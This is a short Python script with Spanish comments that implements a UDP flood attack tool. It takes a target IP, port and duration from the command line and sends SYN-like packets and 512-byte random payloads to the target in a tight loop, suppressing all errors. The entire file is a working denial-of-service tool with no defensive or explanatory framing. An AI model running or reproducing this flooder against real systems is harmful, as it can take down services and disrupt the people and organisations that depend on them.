#!/usr/bin/env python3
import socket
import random
import time
import struct
import sys

def udpsyn_attack(target_ip, target_port, duration):
    print(f"[UDPSYN] Atacando {target_ip}:{target_port} por {duration}s")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    
    while time.time() < end_time:
        try:
            # Paquete que parece SYN
            syn_like = struct.pack('!H', random.randint(1024, 65535)) + \
                      struct.pack('!H', target_port) + \
                      b'\x00\x02'  # SYN flag-like
            sock.sendto(syn_like, (target_ip, target_port))
            
            # Datos normales
            sock.sendto(random._urandom(512), (target_ip, target_port))
        except:
            pass
    
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) == 4:
        udpsyn_attack(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
